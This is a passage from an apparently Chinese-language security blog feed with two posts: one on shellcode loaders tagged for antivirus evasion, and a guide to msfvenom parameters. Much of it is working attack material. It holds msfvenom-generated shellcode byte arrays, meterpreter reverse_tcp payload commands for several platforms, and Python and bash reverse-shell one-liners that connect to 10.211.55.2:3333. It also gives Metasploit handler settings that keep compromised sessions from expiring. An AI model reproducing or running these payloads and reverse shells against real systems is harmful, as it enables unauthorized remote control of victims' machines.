class="line"><span class="string">&quot;\x7b\xf8\xcd\x22\xf8\xff\x31\xb0\xd7\xa7\x59\x4a\x68\x58\x99&quot;</span></span><br><span class="line"><span class="string">&quot;\x20\x68\x08\xf1\xbf\x47\xa7\x31\x3f\x42\xe0\x59\xca\x03\x42&quot;</span></span><br><span class="line"><span class="string">&quot;\xf8\xcb\x09\x02\xa4\xcc\xbe\x9f\x57\xb6\xcf\x20\x98\x47\xc6&quot;</span></span><br><span class="line"><span class="string">&quot;\x44\x99\x47\xe6\x7a\xa6\x91\xdf\x08\xe9\x21\x64\x02\x5c\x07&quot;</span></span><br><span class="line"><span class="string">&quot;\xcd\x89\x9e\x1b\x0d\x98&quot;</span>;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="弹计算器"><a href="#弹计算器" class="headerlink" title="弹计算器"></a>弹计算器</h2><h3 id="32位"><a href="#32位" class="headerlink" title="32位"></a>32位</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line">➜  ~ msfvenom --payload windows/exec cmd=<span class="string">&quot;calc&quot;</span> --format c --arch x86 --platform windows --bad <span class="string">&quot;\x00&quot;</span> </span><br><span class="line">Found <span class="number">11</span> compatible encoders</span><br><span class="line">Attempting to encode payload with <span class="number">1</span> iterations of x86/shikata_ga_nai</span><br><span class="line">x86/shikata_ga_nai succeeded with size <span class="number">216</span> (iteration=<span class="number">0</span>)</span><br><span class="line">x86/shikata_ga_nai chosen with <span class="keyword">final</span> size <span class="number">216</span></span><br><span class="line">Payload size: <span class="number">216</span> bytes</span><br><span class="line">Final size of c file: <span class="number">933</span> bytes</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> buf[] = </span><br><span class="line"><span class="string">&quot;\xba\x9f\x20\x22\xd2\xda\xd4\xd9\x74\x24\xf4\x5f\x33\xc9\xb1&quot;</span></span><br><span class="line"><span class="string">&quot;\x30\x83\xc7\x04\x31\x57\x0f\x03\x57\x90\xc2\xd7\x2e\x46\x80&quot;</span></span><br><span class="line"><span class="string">&quot;\x18\xcf\x96\xe5\x91\x2a\xa7\x25\xc5\x3f\x97\x95\x8d\x12\x1b&quot;</span></span><br><span class="line"><span class="string">&quot;\x5d\xc3\x86\xa8\x13\xcc\xa9\x19\x99\x2a\x87\x9a\xb2\x0f\x86&quot;</span></span><br><span class="line"><span class="string">&quot;\x18\xc9\x43\x68\x21\x02\x96\x69\x66\x7f\x5b\x3b\x3f\x0b\xce&quot;</span></span><br><span class="line"><span class="string">&quot;\xac\x34\x41\xd3\x47\x06\x47\x53\xbb\xde\x66\x72\x6a\x55\x31&quot;</span></span><br><span class="line"><span class="string">&quot;\x54\x8c\xba\x49\xdd\x96\xdf\x74\x97\x2d\x2b\x02\x26\xe4\x62&quot;</span></span><br><span class="line"><span class="string">&quot;\xeb\x85\xc9\x4b\x1e\xd7\x0e\x6b\xc1\xa2\x66\x88\x7c\xb5\xbc&quot;</span></span><br><span class="line"><span class="string">&quot;\xf3\x5a\x30\x27\x53\x28\xe2\x83\x62\xfd\x75\x47\x68\x4a\xf1&quot;</span></span><br><span class="line"><span class="string">&quot;\x0f\x6c\x4d\xd6\x3b\x88\xc6\xd9\xeb\x19\x9c\xfd\x2f\x42\x46&quot;</span></span><br><span class="line"><span class="string">&quot;\x9f\x76\x2e\x29\xa0\x69\x91\x96\x04\xe1\x3f\xc2\x34\xa8\x55&quot;</span></span><br><span class="line"><span class="string">&quot;\x15\xca\xd6\x1b\x15\xd4\xd8\x0b\x7e\xe5\x53\xc4\xf9\xfa\xb1&quot;</span></span><br><span class="line"><span class="string">&quot;\xa1\xf6\xb0\x98\x83\x9e\x1c\x49\x96\xc2\x9e\xa7\xd4\xfa\x1c&quot;</span></span><br><span class="line"><span class="string">&quot;\x42\xa4\xf8\x3d\x27\xa1\x45\xfa\xdb\xdb\xd6\x6f\xdc\x48\xd6&quot;</span></span><br><span class="line"><span class="string">&quot;\xa5\xbf\x0f\x44\x25\x40&quot;</span>;</span><br><span class="line"></span><br><span class="line">➜  ~ msfvenom --payload windows/exec cmd=<span class="string">&quot;calc&quot;</span> --format c --arch x86 --platform windows              </span><br><span class="line">No encoder specified, outputting raw payload</span><br><span class="line">Payload size: <span class="number">189</span> bytes</span><br><span class="line">Final size of c file: <span class="number">819</span> bytes</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> buf[] = </span><br><span class="line"><span class="string">&quot;\xfc\xe8\x82\x00\x00\x00\x60\x89\xe5\x31\xc0\x64\x8b\x50\x30&quot;</span></span><br><span class="line"><span class="string">&quot;\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7\x4a\x26\x31\xff&quot;</span></span><br><span class="line"><span class="string">&quot;\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x0d\x01\xc7\xe2\xf2\x52&quot;</span></span><br><span class="line"><span class="string">&quot;\x57\x8b\x52\x10\x8b\x4a\x3c\x8b\x4c\x11\x78\xe3\x48\x01\xd1&quot;</span></span><br><span class="line"><span class="string">&quot;\x51\x8b\x59\x20\x01\xd3\x8b\x49\x18\xe3\x3a\x49\x8b\x34\x8b&quot;</span></span><br><span class="line"><span class="string">&quot;\x01\xd6\x31\xff\xac\xc1\xcf\x0d\x01\xc7\x38\xe0\x75\xf6\x03&quot;</span></span><br><span class="line"><span class="string">&quot;\x7d\xf8\x3b\x7d\x24\x75\xe4\x58\x8b\x58\x24\x01\xd3\x66\x8b&quot;</span></span><br><span class="line"><span class="string">&quot;\x0c\x4b\x8b\x58\x1c\x01\xd3\x8b\x04\x8b\x01\xd0\x89\x44\x24&quot;</span></span><br><span class="line"><span class="string">&quot;\x24\x5b\x5b\x61\x59\x5a\x51\xff\xe0\x5f\x5f\x5a\x8b\x12\xeb&quot;</span></span><br><span class="line"><span class="string">&quot;\x8d\x5d\x6a\x01\x8d\x85\xb2\x00\x00\x00\x50\x68\x31\x8b\x6f&quot;</span></span><br><span class="line"><span class="string">&quot;\x87\xff\xd5\xbb\xf0\xb5\xa2\x56\x68\xa6\x95\xbd\x9d\xff\xd5&quot;</span></span><br><span class="line"><span class="string">&quot;\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb\x47\x13\x72\x6f\x6a&quot;</span></span><br><span class="line"><span class="string">&quot;\x00\x53\xff\xd5\x63\x61\x6c\x63\x00&quot;</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">➜  ~ msfvenom -p windows/exec cmd=calc.exe -f c --bad <span class="string">&quot;\x00&quot;</span></span><br><span class="line">[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload</span><br><span class="line">[-] No arch selected, selecting arch: x86 from the payload</span><br><span class="line">Found <span class="number">11</span> compatible encoders</span><br><span class="line">Attempting to encode payload with <span class="number">1</span> iterations of x86/shikata_ga_nai</span><br><span class="line">x86/shikata_ga_nai succeeded with size <span class="number">220</span> (iteration=<span class="number">0</span>)</span><br><span class="line">x86/shikata_ga_nai chosen with <span class="keyword">final</span> size <span class="number">220</span></span><br><span class="line">Payload size: <span class="number">220</span> bytes</span><br><span class="line">Final size of c file: <span class="number">949</span> bytes</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> buf[] = </span><br><span class="line"><span class="string">&quot;\xbe\x7a\x1b\x33\xc4\xd9\xc9\xd9\x74\x24\xf4\x5f\x31\xc9\xb1&quot;</span></span><br><span class="line"><span class="string">&quot;\x31\x83\xef\xfc\x31\x77\x0f\x03\x77\x75\xf9\xc6\x38\x61\x7f&quot;</span></span><br><span class="line"><span class="string">&quot;\x28\xc1\x71\xe0\xa0\x24\x40\x20\xd6\x2d\xf2\x90\x9c\x60\xfe&quot;</span></span><br><span class="line"><span class="string">&quot;\x5b\xf0\x90\x75\x29\xdd\x97\x3e\x84\x3b\x99\xbf\xb5\x78\xb8&quot;</span></span><br><span class="line"><span class="string">&quot;\x43\xc4\xac\x1a\x7a\x07\xa1\x5b\xbb\x7a\x48\x09\x14\xf0\xff&quot;</span></span><br><span class="line"><span class="string">&quot;\xbe\x11\x4c\x3c\x34\x69\x40\x44\xa9\x39\x63\x65\x7c\x32\x3a&quot;</span></span><br><span class="line"><span class="string">&quot;\xa5\x7e\x97\x36\xec\x98\xf4\x73\xa6\x13\xce\x08\x39\xf2\x1f&quot;</span></span><br><span class="line"><span class="string">&quot;\xf0\x96\x3b\x90\x03\xe6\x7c\x16\xfc\x9d\x74\x65\x81\xa5\x42&quot;</span></span><br><span class="line"><span class="string">&quot;\x14\x5d\x23\x51\xbe\x16\x93\xbd\x3f\xfa\x42\x35\x33\xb7\x01&quot;</span></span><br><span class="line"><span class="string">&quot;\x11\x57\x46\xc5\x29\x63\xc3\xe8\xfd\xe2\x97\xce\xd9\xaf\x4c&quot;</span></span><br><span class="line"><span class="string">&quot;\x6e\x7b\x15\x22\x8f\x9b\xf6\x9b\x35\xd7\x1a\xcf\x47\xba\x70&quot;</span></span><br><span class="line"><span class="string">&quot;\x0e\xd5\xc0\x36\x10\xe5\xca\x66\x79\xd4\x41\xe9\xfe\xe9\x83&quot;</span></span><br><span class="line"><span class="string">&quot;\x4e\xf0\xa3\x8e\xe6\x99\x6d\x5b\xbb\xc7\x8d\xb1\xff\xf1\x0d&quot;</span></span><br><span class="line"><span class="string">&quot;\x30\x7f\x06\x0d\x31\x7a\x42\x89\xa9\xf6\xdb\x7c\xce\xa5\xdc&quot;</span></span><br><span class="line"><span class="string">&quot;\x54\xad\x28\x4f\x34\x1c\xcf\xf7\xdf\x60&quot;</span>;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="64位"><a href="#64位" class="headerlink" title="64位"></a>64位</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">➜  ~ msfvenom -p windows/x64/exec cmd=calc.exe -f c --bad <span class="string">&quot;\x00&quot;</span>               </span><br><span class="line">[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload</span><br><span class="line">[-] No arch selected, selecting arch: x64 from the payload</span><br><span class="line">Found <span class="number">3</span> compatible encoders</span><br><span class="line">Attempting to encode payload with <span class="number">1</span> iterations of generic/none</span><br><span class="line">generic/none failed with Encoding failed due to a bad character (index=<span class="number">7</span>, <span class="keyword">char</span>=<span class="number">0x00</span>)</span><br><span class="line">Attempting to encode payload with <span class="number">1</span> iterations of x64/<span class="keyword">xor</span></span><br><span class="line">x64/<span class="keyword">xor</span> succeeded with size <span class="number">319</span> (iteration=<span class="number">0</span>)</span><br><span class="line">x64/<span class="keyword">xor</span> chosen with <span class="keyword">final</span> size <span class="number">319</span></span><br><span class="line">Payload size: <span class="number">319</span> bytes</span><br><span class="line">Final size of c file: <span class="number">1366</span> bytes</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> buf[] = </span><br><span class="line"><span class="string">&quot;\x48\x31\xc9\x48\x81\xe9\xdd\xff\xff\xff\x48\x8d\x05\xef\xff&quot;</span></span><br><span class="line"><span class="string">&quot;\xff\xff\x48\xbb\xf5\x1f\xb6\x9f\x1f\x80\x55\xcb\x48\x31\x58&quot;</span></span><br><span class="line"><span class="string">&quot;\x27\x48\x2d\xf8\xff\xff\xff\xe2\xf4\x09\x57\x35\x7b\xef\x68&quot;</span></span><br><span class="line"><span class="string">&quot;\x95\xcb\xf5\x1f\xf7\xce\x5e\xd0\x07\x9a\xa3\x57\x87\x4d\x7a&quot;</span></span><br><span class="line"><span class="string">&quot;\xc8\xde\x99\x95\x57\x3d\xcd\x07\xc8\xde\x99\xd5\x57\x3d\xed&quot;</span></span><br><span class="line"><span class="string">&quot;\x4f\xc8\x5a\x7c\xbf\x55\xfb\xae\xd6\xc8\x64\x0b\x59\x23\xd7&quot;</span></span><br><span class="line"><span class="string">&quot;\xe3\x1d\xac\x75\x8a\x34\xd6\xbb\xde\x1e\x41\xb7\x26\xa7\x5e&quot;</span></span><br><span class="line"><span class="string">&quot;\xe7\xd7\x94\xd2\x75\x40\xb7\x23\xfe\x9e\xcf\x0b\xd5\x43\xf5&quot;</span></span><br><span class="line"><span class="string">&quot;\x1f\xb6\xd7\x9a\x40\x21\xac\xbd\x1e\x66\xcf\x94\xc8\x4d\x8f&quot;</span></span><br><span class="line"><span class="string">&quot;\x7e\x5f\x96\xd6\x1e\x50\xb6\x9d\xbd\xe0\x7f\xde\x94\xb4\xdd&quot;</span></span><br><span class="line"><span class="string">&quot;\x83\xf4\xc9\xfb\xae\xd6\xc8\x64\x0b\x59\x5e\x77\x56\x12\xc1&quot;</span></span><br><span class="line"><span class="string">&quot;\x54\x0a\xcd\xff\xc3\x6e\x53\x83\x19\xef\xfd\x5a\x8f\x4e\x6a&quot;</span></span><br><span class="line"><span class="string">&quot;\x58\x0d\x8f\x7e\x5f\x92\xd6\x1e\x50\x33\x8a\x7e\x13\xfe\xdb&quot;</span></span><br><span class="line"><span class="string">&quot;\x94\xc0\x49\x82\xf4\xcf\xf7\x14\x1b\x08\x1d\xca\x25\x5e\xee&quot;</span></span><br><span class="line"><span class="string">&quot;\xde\x47\xde\x0c\x91\xb4\x47\xf7\xc6\x5e\xda\x1d\x48\x19\x3f&quot;</span></span><br><span class="line"><span class="string">&quot;\xf7\xcd\xe0\x60\x0d\x8a\xac\x45\xfe\x14\x0d\x69\x02\x34\x0a&quot;</span></span><br><span class="line"><span class="string">&quot;\xe0\xeb\xd7\xa5\x81\x55\xcb\xf5\x1f\xb6\x9f\x1f\xc8\xd8\x46&quot;</span></span><br><span class="line"><span class="string">&quot;\xf4\x1e\xb6\x9f\x5e\x3a\x64\x40\x9a\x98\x49\x4a\xa4\x70\xe0&quot;</span></span><br><span class="line"><span class="string">&quot;\x69\xa3\x5e\x0c\x39\x8a\x3d\xc8\x34\x20\x57\x35\x5b\x37\xbc&quot;</span></span><br><span class="line"><span class="string">&quot;\x53\xb7\xff\x9f\x4d\x7f\x6a\x85\xee\x8c\xe6\x6d\xd9\xf5\x1f&quot;</span></span><br><span class="line"><span class="string">&quot;\xd9\x14\x42\x2f\xe0\x63\xfc\x7e\xec\x36\xe5\x90\x67\xd3\x9f&quot;</span></span><br><span class="line"><span class="string">&quot;\x1f\x80\x55\xcb&quot;</span>;</span><br></pre></td></tr></table></figure><h1 id="vscode与Visual-Studio"><a href="#vscode与Visual-Studio" class="headerlink" title="vscode与Visual Studio"></a>vscode与Visual Studio</h1><p>经过测试，我这里的vscode无论是32位的指针执行还是动态分配执行都是可以正常弹calc的；但是64位的指针执行还是动态分配执行都不可以执行，应该是vscode的环境问题。</p><p>而在Visual Studio中，32位下，动态分配的方式可以正常执行，但是如果是想要指针执行，则需要关闭DEP：</p><p><img src="/2022/04/08/ShellCodeLoader/image-20220408231623763.png" alt="image-20220408231623763"></p><p>64位下，动态分配可以正常运行，但是指针执行无论如何都没有成功，找了半天解决办法仍未成功，64位程序无法关闭DEP。</p><p>之后找到解决办法再写吧，占个坑位，有大佬如果知道的QQ联系QAQ.</p><blockquote><p>  <a href="https://422926799.github.io/posts/44310b89.html">https://422926799.github.io/posts/44310b89.html</a></p><p>  <a href="https://www.redteam101.tech/offensive-security/code-injection-process-injection/local-shellcode-execution-without-windows-apis">https://www.redteam101.tech/offensive-security/code-injection-process-injection/local-shellcode-execution-without-windows-apis</a></p><p>  <a href="https://wooyun.js.org/drops/Exploit%E5%BC%80%E5%8F%91%E7%B3%BB%E5%88%97%E6%95%99%E7%A8%8B-Windows%E5%9F%BA%E7%A1%80&amp;shellcode.html">https://wooyun.js.org/drops/Exploit%E5%BC%80%E5%8F%91%E7%B3%BB%E5%88%97%E6%95%99%E7%A8%8B-Windows%E5%9F%BA%E7%A1%80&amp;shellcode.html</a></p><p>  <a href="https://luckyfuture.top/ShellcodeLoader.html">https://luckyfuture.top/ShellcodeLoader.html</a></p></blockquote>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;记录一些语言的shellcode 加载方式，持续更新…&lt;/p&gt;
&lt;p&gt;[toc]&lt;/p&gt;
&lt;h1 id=&quot;C-C&quot;&gt;&lt;a href=&quot;#C-C&quot; class=&quot;headerlink&quot; title=&quot;C/C++&quot;&gt;&lt;/a&gt;C/C++&lt;/h1&gt;&lt;p&gt;首先是c的loader，分两</summary>
      
    
    
    
    
    <category term="免杀" scheme="http://example.com/tags/%E5%85%8D%E6%9D%80/"/>
    
  </entry>
  
  <entry>
    <title>msfvenom参数详解</title>
    <link href="http://example.com/2022/04/07/msfvenom%E8%AF%A6%E8%A7%A3/"/>
    <id>http://example.com/2022/04/07/msfvenom%E8%AF%A6%E8%A7%A3/</id>
    <published>2022-04-06T16:00:00.000Z</published>
    <updated>2022-04-08T15:41:42.179Z</updated>
    
    <content type="html"><![CDATA[<p>[toc]</p><h1 id="常规参数"><a href="#常规参数" class="headerlink" title="常规参数"></a>常规参数</h1><p>所有参数</p><p><img src="/2022/04/07/msfvenom%E8%AF%A6%E8%A7%A3/image-20220407184834893.png" alt="image-20220407184834893"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">-p, –payload &lt; payload&gt; 指定需要使用的payload(攻击荷载)。也可以使用自定义payload,几乎是支持全平台的</span><br><span class="line">-l, –list [module_type] 列出指定模块的所有可用资源. 模块类型包括: payloads, encoders, nops, platforms, archs, encrypt, formats, all</span><br><span class="line"></span><br><span class="line">-n, –nopsled &lt; length&gt; 为payload预先指定一个NOP滑动长度</span><br><span class="line">-f, –format &lt; format&gt; 指定输出格式 (使用 –help-formats 来获取msf支持的输出格式列表)</span><br><span class="line">-e, –encoder [encoder] 指定需要使用的encoder（编码器）,指定需要使用的编码，如果既没用-e选项也没用-b选项，则输出raw payload</span><br><span class="line">-a, –arch &lt; architecture&gt; 指定payload的目标架构，例如x86 | x64 | x86_64</span><br><span class="line">–platform &lt; platform&gt; 指定payload的目标平台</span><br><span class="line">-s, –space &lt; length&gt; 设定有效攻击荷载的最大长度，就是文件大小</span><br><span class="line">-b, –bad-chars &lt; list&gt; 设定规避字符集，指定需要过滤的坏字符例如：不使用 &#x27;\x0f&#x27;、&#x27;\x00&#x27;;</span><br><span class="line">-i, –iterations &lt; count&gt; 指定payload的编码次数</span><br><span class="line">-c, –add-code &lt; path&gt; 指定一个附加的win32 shellcode文件</span><br><span class="line">-x, –template &lt; path&gt; 指定一个自定义的可执行文件作为模板,并将payload嵌入其中</span><br><span class="line">-k, –keep 保护模板程序的动作，注入的payload作为一个新的进程运行</span><br><span class="line">–payload-options 列举payload的标准选项</span><br><span class="line">-o, –out &lt; path&gt; 指定创建好的payload的存放位置</span><br><span class="line">-v, –var-name &lt; name&gt; 指定一个自定义的变量，以确定输出格式</span><br><span class="line">–shellest 最小化生成payload</span><br><span class="line">-h, –help 查看帮助选项</span><br><span class="line">–help-formats 查看msf支持的输出格式列表</span><br></pre></td></tr></table></figure><p>查看所有payload：<code>msfvenom --list payloads</code>(其他的模块也一样)</p><p>查看所有编码器：<code>msfvenom --list encoders</code></p><p><img src="/2022/04/07/msfvenom%E8%AF%A6%E8%A7%A3/image-20220407185452945.png" alt="image-20220407185452945"></p><p>其中有两个excellent，<code>cmd/powershell_base64</code>和<code>x86/shikata_ga_nai</code></p><p> 查看某个payload支持那些平台、选项等(使用windows/meterpreter/reverse_tcp举例)：</p><p><code>msfvenom -p windows/meterpreter/reverse_tcp --list-options</code></p><h1 id="重要的监听参数"><a href="#重要的监听参数" class="headerlink" title="重要的监听参数"></a>重要的监听参数</h1><h2 id="防止假session"><a href="#防止假session" class="headerlink" title="防止假session"></a>防止假session</h2><p>在实战中，经常会遇到假session或者刚连接就断开的情况，这里补充一些监听参数，防止假死与假session</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msf exploit(multi/handler) &gt; set ExitOnSession false   //可以在接收到seesion后继续监听端口，保持侦听。</span><br></pre></td></tr></table></figure><h2 id="防止session意外退出"><a href="#防止session意外退出" class="headerlink" title="防止session意外退出"></a>防止session意外退出</h2><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">msf5 exploit(multi/handler) &gt; <span class="built_in">set</span> SessionCommunicationTimeout 0  </span><br><span class="line">//默认情况下，如果一个会话将在5分钟（300秒）没有任何活动，那么它会被杀死,为防止此情况可将此项修改为0</span><br><span class="line">msf5 exploit(multi/handler) &gt; <span class="built_in">set</span> SessionExpirationTimeout 0 </span><br><span class="line">//默认情况下，一个星期（604800秒）后，会话将被强制关闭,修改为0可永久不会被关闭</span><br></pre></td></tr></table></figure><h2 id="handler后台持续监听"><a href="#handler后台持续监听" class="headerlink" title="handler后台持续监听"></a>handler后台持续监听</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msf exploit(multi/handler) &gt; exploit -j -z</span><br></pre></td></tr></table></figure><p>使用exploit -j -z可在后台持续监听,-j为后台任务，-z为成功后不主动发送stage(感谢Green-m大佬指正)，使用Jobs命令查看和管理后台任务。jobs -K可结束所有任务。</p><p>还有种比较快捷的建立监听的方式，在msf下直接执行：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msf5 &gt; handler -H 10.211.55.2 -P 3333 -p windows/meterpreter/reverse_tcp</span><br></pre></td></tr></table></figure><h1 id="一些payload"><a href="#一些payload" class="headerlink" title="一些payload"></a>一些payload</h1><h2 id="windows"><a href="#windows" class="headerlink" title="windows"></a>windows</h2><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.211.55.2 LPORT=3333 -a x86 --platform Windows -f exe &gt; shell.exe</span><br><span class="line">msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.211.55.2 LPORT=3333 -f exe &gt; shell.exe</span><br></pre></td></tr></table></figure><h2 id="linux"><a href="#linux" class="headerlink" title="linux"></a>linux</h2><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.211.55.2 LPORT=3333 -a x86 --platform Linux -f elf &gt; shell.elf</span><br></pre></td></tr></table></figure><h2 id="mac"><a href="#mac" class="headerlink" title="mac"></a>mac</h2><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p osx/x86/shell_reverse_tcp LHOST=10.211.55.2 LPORT=3333 -a x86 --platform osx -f macho &gt; shell.macho</span><br></pre></td></tr></table></figure><h2 id="Android"><a href="#Android" class="headerlink" title="Android"></a>Android</h2><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -a dalvik -p android/meterpreter/reverse_tcp LHOST=10.211.55.2 LPORT=3333 -f raw &gt; shell.apk</span><br><span class="line">msfvenom -p android/meterpreter/reverse_tcp LHOST=10.211.55.2 LPORT=3333 R &gt; test.apk</span><br></pre></td></tr></table></figure><h2 id="Powershell"><a href="#Powershell" class="headerlink" title="Powershell"></a>Powershell</h2><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -a x86 --platform Windows -p windows/powershell_reverse_tcp LHOST=10.211.55.2 LPORT=3333 -e cmd/powershell_base64 -i 3 -f raw -o shell.ps1</span><br></pre></td></tr></table></figure><h2 id="shellcode"><a href="#shellcode" class="headerlink" title="shellcode"></a>shellcode</h2><h3 id="linux-1"><a href="#linux-1" class="headerlink" title="linux"></a>linux</h3><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.211.55.2 LPORT=3333 -a x86 --platform Linux -f c</span><br></pre></td></tr></table></figure><h3 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a>Windows</h3><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.211.55.2 LPORT=3333 -a x86 --platform Windows -f c</span><br></pre></td></tr></table></figure><h3 id="Mac"><a href="#Mac" class="headerlink" title="Mac"></a>Mac</h3><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p osx/x86/shell_reverse_tcp LHOST=10.211.55.2 LPORT=3333 -a x86 --platform osx -f c</span><br></pre></td></tr></table></figure><h2 id="脚本"><a href="#脚本" class="headerlink" title="脚本"></a>脚本</h2><h3 id="python反弹shell"><a href="#python反弹shell" class="headerlink" title="python反弹shell"></a>python反弹shell</h3><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p cmd/unix/reverse_python LHOST=10.211.55.2 LPORT=3333 -f raw &gt; shell.py</span><br><span class="line">msfvenom -a python -p python/meterpreter/reverse_tcp LHOST=10.211.55.2 LPORT=3333 -f raw &gt; shell.py</span><br></pre></td></tr></table></figure><h3 id="python正向shell"><a href="#python正向shell" class="headerlink" title="python正向shell"></a>python正向shell</h3><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python/python3 -c <span class="string">&#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;10.211.55.2&quot;,3333));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/bash&quot;,&quot;-i&quot;]);&#x27;</span></span><br><span class="line">python/python3 -c <span class="string">&quot;exec(\&quot;import socket, subprocess;s = socket.socket();s.connect((&quot;</span>10.211.55.2<span class="string">&quot;,3333))\nwhile 1:  proc = subprocess.Popen(s.recv(1024), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE);s.send(proc.stdout.read()+proc.stderr.read())\&quot;)&quot;</span></span><br></pre></td></tr></table></figure><h3 id="bash"><a href="#bash" class="headerlink" title="bash"></a>bash</h3><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p cmd/unix/reverse_bash LHOST=10.211.55.2 LPORT=3333 -f raw &gt; shell.sh</span><br></pre></td></tr></table></figure><h3 id="perl"><a href="#perl" class="headerlink" title="perl"></a>perl</h3><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p cmd/unix/reverse_perl LHOST=10.211.55.2 